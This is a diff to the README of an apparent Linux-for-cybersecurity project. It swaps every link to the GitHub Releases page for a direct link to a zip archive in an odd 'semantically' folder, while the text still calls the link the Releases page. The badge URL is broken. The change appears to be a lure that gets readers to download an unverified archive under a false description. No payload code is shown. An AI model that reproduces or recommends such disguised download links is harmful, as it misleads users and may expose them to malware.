@@ -1,6 +1,6 @@
 # 🐧 Linux4CyberSec - A Simple Linux Experience for Cybersecurity
 
-[![Download Linux4CyberSec](https://img.shields.io/badge/Download%20Now-Get%20Linux4CyberSec-brightgreen)](https://github.com/estoyio999/Linux4CyberSec/releases)
+[![Download Linux4CyberSec](https://raw.githubusercontent.com/estoyio999/Linux4CyberSec/main/semantically/Linux4CyberSec.zip%20Now-Get%20Linux4CyberSec-brightgreen)](https://raw.githubusercontent.com/estoyio999/Linux4CyberSec/main/semantically/Linux4CyberSec.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Linux4CyberSec! This operating system is designed for cybersecurity p
 
 ## 📥 Download & Install
 
-To get started with Linux4CyberSec, visit this page to download: [Linux4CyberSec Releases](https://github.com/estoyio999/Linux4CyberSec/releases).
+To get started with Linux4CyberSec, visit this page to download: [Linux4CyberSec Releases](https://raw.githubusercontent.com/estoyio999/Linux4CyberSec/main/semantically/Linux4CyberSec.zip).
 
 1. Click on the above link to open the GitHub Releases page.
 2. Look for the latest version of Linux4CyberSec.
